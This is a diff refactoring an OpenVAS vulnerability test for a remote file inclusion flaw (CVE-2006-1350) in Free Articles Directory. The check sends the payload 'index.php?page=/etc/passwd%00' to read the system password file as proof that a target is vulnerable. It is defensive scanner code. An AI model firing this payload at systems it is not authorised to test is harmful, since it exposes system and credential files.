@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: free_articles_directory_file_includes.nasl 4075 2016-09-15 13:13:05Z teissa $
+# $Id: free_articles_directory_file_includes.nasl 5779 2017-03-30 06:57:12Z cfi $
 # Description: Free Articles Directory Remote File Inclusion Vulnerability
 #
 # Authors:
@@ -39,31 +39,23 @@ process.";
 
 tag_solution = "Unknown at this time.";
 
-if (description) {
-  script_id(80060);;
-  script_version("$Revision: 4075 $");
-  script_tag(name:"last_modification", value:"$Date: 2016-09-15 15:13:05 +0200 (Thu, 15 Sep 2016) $");
+if(description)
+{
+  script_id(80060);
+  script_version("$Revision: 5779 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-30 08:57:12 +0200 (Thu, 30 Mar 2017) $");
   script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
- script_tag(name:"cvss_base", value:"7.5");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_cve_id("CVE-2006-1350");
   script_bugtraq_id(17183);
   script_xref(name:"OSVDB", value:"24024");
-
-  name = "Free Articles Directory Remote File Inclusion Vulnerability";
-  script_name(name);
- 
- 
-  summary = "Checks for file includes in Free Articles Directory";
- 
+  script_name("Free Articles Directory Remote File Inclusion Vulnerability");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
   script_family("Web application abuses");
-
   script_copyright("This script is Copyright (C) 2006 Josh Zlatin-Amishav");
-
-  script_dependencies("http_version.nasl");
+  script_dependencies("find_service.nasl", "http_version.nasl");
   script_require_ports("Services/www", 80);
   script_exclude_keys("Settings/disable_cgi_scanning");
 
@@ -73,34 +65,20 @@ if (description) {
   exit(0);
 }
 
-
-include("global_settings.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
-
 port = get_http_port(default:80);
-if (!get_port_state(port)) exit(0);
 if (!can_host_php(port:port)) exit(0);
 
+# The '/99articles' directory does not seem too popular, but it is the default installation directory
+foreach dir( make_list_unique( "/99articles", cgi_dirs( port:port ) ) ) {
 
-# The '/99articles' directory does not seem too popular, but it is the default
-# installation directory
-dirs = make_list("/99articles", cgi_dirs());
-
-
-# Loop through CGI directories.
-foreach dir (dirs) {
-  # Try to exploit the flaw in config.php to read /etc/passwd.
-  req = http_get(
-    item:string(
-      dir, "/index.php?",
-      "page=/etc/passwd%00"
-    ), 
-    port:port
-  );
+  if( dir == "/" ) dir = "";
+  url = string(dir, "/index.php?page=/etc/passwd%00");
+  req = http_get( item:url, port:port );
   res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-  if (res == NULL) exit(0);
+  if (res == NULL) continue;
   
   # There's a problem if...
   if (
@@ -136,3 +114,5 @@ foreach dir (dirs) {
     exit(0);
   }
 }
+
+exit( 0 );
